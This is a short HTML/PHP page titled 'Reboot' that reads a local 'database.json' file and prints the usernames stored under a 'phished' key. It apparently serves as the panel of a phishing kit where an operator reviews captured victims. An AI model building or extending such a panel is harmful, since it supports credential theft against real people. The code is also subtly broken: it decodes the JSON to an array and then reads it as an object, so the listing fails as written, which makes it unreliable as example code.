<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles/header.css">
    <title>Reboot</title>
</head>
<body>
    <?php
        include "inc/header.php";
    ?>
    <?php
        $string = file_get_contents("database.json");
        if ($string === false) {
            echo "DataBase not connected";
        } else {
            $json_a = json_decode($string, true);
            foreach ($json_a->phished as $phishedMan) {
              echo "<p>".$phishedMan['username']."</p><br>";
            }
        }
    ?>
</body>
</html>